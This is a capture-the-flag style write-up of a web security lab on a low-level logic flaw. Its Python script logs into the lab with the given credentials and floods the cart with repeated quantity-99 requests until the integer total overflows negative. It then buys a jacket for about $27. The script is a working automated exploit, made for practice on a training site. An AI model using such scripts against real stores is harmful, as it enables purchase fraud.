# Low-level logic flaw

> This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".
> You can log in to your own account using the following credentials: `wiener:peter`
#### Hint
> You will need to use Burp Intruder (or Turbo Intruder) to solve this lab.
> To make sure the price increases in predictable increments, we recommend configuring your attack to only send one request at a time. In Burp Intruder, you can do this from the resource pool settings using the **Maximum concurrent requests** option.

```python
import requests
import sys
from bs4 import BeautifulSoup

BASE_URL = "https://0afc00b50342bf6e80e2443000de0062.web-security-academy.net/"

def exploit(url):
    session = requests.Session()
    
    # 1. Authentication Phase
    login_endpoint = url + "login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    login_credentials = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    
    response = session.post(login_endpoint, data=login_credentials)
    if "Log out" not in response.text:
        print("[-] LOGIN FAILED.")
        return
        
    print("[+] LOG IN SUCCESSFUL")
    
    # 2. Memory Overload Phase
    cart_endpoint = url + "cart"
    print("[*] Initiating Integer Overflow. Bombarding cart...")
    
    overload_payload = {
        "productId": 1,
        "redir": "PRODUCT",
        "quantity": 99
    }
    
    # 324 iterations
    for i in range(324):
        sys.stdout.write(f"\r[*] Current Status: {i + 1}/324 requests sent")
        sys.stdout.flush()
        session.post(cart_endpoint, data=overload_payload)
        
    # 3. Precision Strike
    precision_payload = {
        "productId": 1,
        "redir": "PRODUCT",
        "quantity": 47 
    }
    session.post(cart_endpoint, data=precision_payload)
    print("\n[+] PRECISION STRIKE DONE: Cart total is now -$1221.96")
    
    # 4. Stabilization Phase
    filler_payload = {
        "productId": 7,
        "redir": "PRODUCT",
        "quantity": 26
    }
    session.post(cart_endpoint, data=filler_payload)
    print("[+] FILLER ITEM ADDED: Cart stabilized at $27.34")
    
    # 5. Checkout Phase
    response = session.get(cart_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    checkout_csrf = soup.find("input", {"name": "csrf"})['value']
    
    checkout_payload = {
        "csrf": checkout_csrf
    }
    
    checkout_endpoint = url + "cart/checkout"
    session.post(checkout_endpoint, data=checkout_payload)
    
    # 6. Verification
    final_response = session.get(url)
    if "Congratulations" in final_response.text:
        print("[+] EXPLOIT SUCCESSFUL: Lab Solved")
    else:
        print("[-] Checkout completed, but lab not flagged as solved.")

if __name__ == "__main__":
    exploit(BASE_URL)
```